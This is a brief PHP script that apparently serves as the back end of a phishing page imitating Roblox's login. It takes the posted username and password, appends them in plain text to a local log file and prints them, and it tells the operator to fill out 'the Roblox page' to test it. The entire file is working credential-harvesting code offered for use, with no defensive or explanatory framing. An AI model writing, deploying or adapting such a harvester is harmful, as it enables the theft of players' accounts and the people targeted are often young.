<?php
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $username = $_POST['username'];
        $password = $_POST['password'];
        
        // Save to file
        $file = fopen('log.txt', 'a');
        fwrite($file, "Username: " . $username . " | Password: " . $password . "\n");
        fclose($file);
        
        // Show the data on screen
        echo "Username: " . $username . "<br>Password: " . $password;
    }
    
    // If no data sent, show the form (optional, but good for testing)
    if ($_SERVER['REQUEST_METHOD'] != 'POST') {
        echo "No data received yet. Go to the Roblox page, fill it out, and click Submit.";
    }
?>
